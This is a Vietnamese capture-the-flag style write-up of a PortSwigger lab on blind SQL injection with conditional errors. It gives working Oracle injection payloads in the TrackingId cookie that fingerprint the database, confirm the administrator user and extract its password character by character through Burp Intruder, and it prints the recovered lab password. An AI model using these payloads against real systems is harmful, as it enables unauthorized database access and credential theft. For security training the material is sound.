## Blind SQL injection with conditional errors

Sau khi thử TrackingId để tìm ra cơ sở dữ liệu Lab đang sử dụng thì chỉ có câu lệnh này sẽ load được còn các lệnh từ các csdl khác đều sẽ error => Oracle
> **TrackingId=k7oJYXEj2adTxvrq'+UNION+SELECT+banner+FROM+v$version--**

Nhưng ở đây, mặc dù load thành công mà nó lại không hiển thị lên gì cả (ta xác định nó có thể là blind), do đó chúng ta sẽ thử điều kiện lỗi để xác định.

Sử dụng query như bên dưới, chúng ta có thể áp dụng phép nối chuỗi trong Oracle
> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT '' FROM DUAL)||'**

![](/imgs/SQL-Injection/50.png?raw=true)

Ta sẽ sử dụng query như sau để kiểm tra bảng có tồn tại không (nó sẽ trả về đúng nếu có 1 bảng users tồn tại):
> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT '' FROM users where rownum=1)||'**

![](/imgs/SQL-Injection/51.png?raw=true)

Kiểm tra như thế đủ rồi, chúng ta sẽ tiến hành inject vào 1 điều kiện lỗi để database xử lý xem như thế nào.
> **SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual (cheatsheet Oracle database)** ([cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) hân hạnh tài trợ chương trình này....)

Chúng ta sẽ áp dụng vào
> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT CASE WHEN (1=0) THEN to_char(1/0) ELSE NULL END FROM dual)||'**

Hàm to_char để chuyển số hoặc ngày tháng sang chuỗi (nhưng ở đây nó sẽ trả ra lỗi bởi vì đó là phép tính 1/0 :v)

=> Có nghĩa là nếu điều kiện 1=0 đúng thì sẽ trả về vế phía trước thực thi hàm to_char(1/0) còn ngược lại sẽ là NULL;

![](/imgs/SQL-Injection/52.png?raw=true)

Vì trả về là NULL nên web vẫn load bình thường, chúng ta cũng có thể test thử với trường hợp là 1=1 sẽ cho ra Internal Server Error.

Từ đây chúng ta có thể hiểu là ***ĐÚNG THÀNH SAI, SAI THÀNH ĐÚNG*** (bởi vì nếu điều kiện đúng sẽ trả ra 'internal server error' và điều kiện sai thì sẽ trả ra bình thường) :v

Ta sẽ áp dụng công thức sau đây để tránh bị rối não trước khi xuống tiếp phía dưới.

> Đúng + Đúng -> Trả ra Error (Do thực thi cái hàm To_Char)
> Đúng + Sai -> Trả về bình thường (do query trả về là NULL)

Chúng ta sẽ tiếp tục
> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM users where username='administrator')||'**

Hoặc chúng ta có thể
> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT to_char(1/0) FROM users where username='administrator')||'**

Nhưng ở phần Solution có gợi ý dùng cái câu điều kiện sai cũng hay hay nên triển luôn =)))

> Vế này đã thêm 1 điều kiện where ở sau, nếu chỉ có 1 điều kiện 1=1 thì nó sẽ trả về error như đã nói ở bên trên, nhưng nếu điều kiện where mà có user là administrator (nó sẽ là True) và nó vẫn sẽ trả về Error.
> Và nếu thay administrator thành 1 user không hề tồn tại nó sẽ load bình thường
Ví dụ thêm chữ ‘s’ sau administrator => Load bình thường => Chã có user nào administrators (có s) cả.

![](/imgs/SQL-Injection/53.png?raw=true)

Còn không có ‘s’ => Load Error => user có tồn tại

![](/imgs/SQL-Injection/54.png?raw=true)

Sau khi đã xác nhận administrator có tồn tại thì chúng ta sẽ xác định password có chiều dài bao nhiêu.
> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM users where username='administrator' and LENGTH(password)>50)||'**

***Nhắc lại 1 lần nữa, vẫn như ý ở trên, nếu password mà > 50 mà sai nữa => Web load bình thường.
Còn nếu password nhỏ hơn 50 => Web load Error.***

![](/imgs/SQL-Injection/55.png?raw=true)

Chúng ta sẽ tiến hành bruteforce để xem chính xác password có chiều dài bao nhiêu.

Send Request sang Intruder và set lại dấu đô la ngay số 50 để đánh dấu đó là biến. Sau đó sang payload và chọn bruteforce kiểu number từ 1-50 với step là 1.

Như hình bên dưới ta có thể xác định được password có chiều dài chính xác 20 kí tự.

![](/imgs/SQL-Injection/56.png?raw=true)

Tiếp tục áp dụng lại kỹ thuật như Lab 9 chúng ta sẽ sử dụng 2 biến ở chỗ số thứ tự substring (độ dài pass) và 1 biến nữa là chuỗi để so sánh.
> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM users where username='administrator' and Substr(password,§1§,1)='§h§')||'**  (Substr là hàm tách chuỗi ở oracle)

![](/imgs/SQL-Injection/57.png?raw=true)

Sắp xếp theo thứ tự payload1 tương ứng với giá trị payload2 ta sẽ được Drbd91cznbq7e5gv4liv

Login vào tài khoản administrator là solve

![](/imgs/SQL-Injection/58.png?raw=true)




